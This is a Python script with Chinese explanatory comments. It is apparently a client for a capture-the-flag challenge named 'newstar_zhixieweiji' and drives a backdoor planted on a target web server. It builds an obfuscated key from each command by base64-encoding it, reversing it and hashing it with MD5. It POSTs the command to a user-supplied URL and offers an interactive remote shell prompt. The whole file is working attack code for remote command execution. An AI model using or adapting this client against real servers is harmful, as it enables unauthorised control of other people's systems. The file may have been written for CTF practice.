# 用于发送 HTTP POST 请求
import requests
# 用于 Base64 编码/解码
import base64
# 用于计算 MD5 哈希值
import hashlib

#获取用户输入的目标 URL（包含后门脚本的网址）
print("[+] shell for newstar_zhixieweiji")
url = input("[+] Enter the target URl:")

# 接收要执行的系统命令作为参数。
def execute_command(cmd):
    # 先执行cmd.encoded()：将字符串转化为字节
    # base64.b64encode():base64编码字节数据
    # .decode():将字节结果转换回字符串
    # 类如 "id" → "aWQ="
    cmd_encoded = base64.b64encode(cmd.encode()).decode()

    #反转Base64字符串 string[start:stop:step]    start：起始位置（默认 0）  stop：结束位置（默认末尾）  step：步长（默认 1）
    # 当 step = -1 时，表示从后往前逐个取字符。 例："aWQ=" → "=QWa"
    cmd_reversed = cmd_encoded[::-1]

    #字符反转之后，先将字符串转换为字节，然后创建一个MD5哈希对象，获取十六进制哈希值
    # 例如 "=QWa" → "1b1e8c1c3b5b832312e0e8a6a1a3c3d3"
    hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()

    # 对哈希值再次进行base64编码 #"1b1e8c1c..." → "MWIxZThj..."
    encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()

    # 发送POST请求
    # 构造了一个payload字典，发送post请求到目标URl
    # 创建一个 Python 字典，包含两个键值对

    # 假设执行 "id" 命令
    # cmd_encoded = "aWQ="
    # encoded_key = "MWIxZThjMWMzYjViODMyMzEyZTBlOGE2YTFhM2MzZDM="
    #
    # payload = {
    #     'cmd': "aWQ=",
    #     'key': "MWIxZThjMWMzYjViODMyMzEyZTBlOGE2YTFhM2MzZDM="
    # }

    payload = {'cmd':cmd_encoded,'key':encoded_key}

    # requests.post()：requests模块中用于发送
    # POST 请求的函数url：目标服务器的URL地址
    # data = payload：要发送的表单数据
    # response：服务器返回的响应对象
    response = requests.post(url,data=payload)
    # 自动解码响应体为字符串
    # 根据响应头Content - Type猜测编码，或使用response.encoding
    # 包含服务器返回的全部文本内容
    return response.text[:-1]
hostname = execute_command("hostname")
username = execute_command("whoami")

# 获取当前目录：execute_command("pwd")
# 显示提示符：格式为 username@hostname:directory$
# 获取用户输入：等待用户输入命令
# 执行命令：通过 execute_command() 发送到目标
# 输出结果：显示命令执行结果
while True:
    directory = execute_command("pwd")
    command = input(f"{username}@{hostname}:{directory}$")
    output = execute_command(command)
    print(output)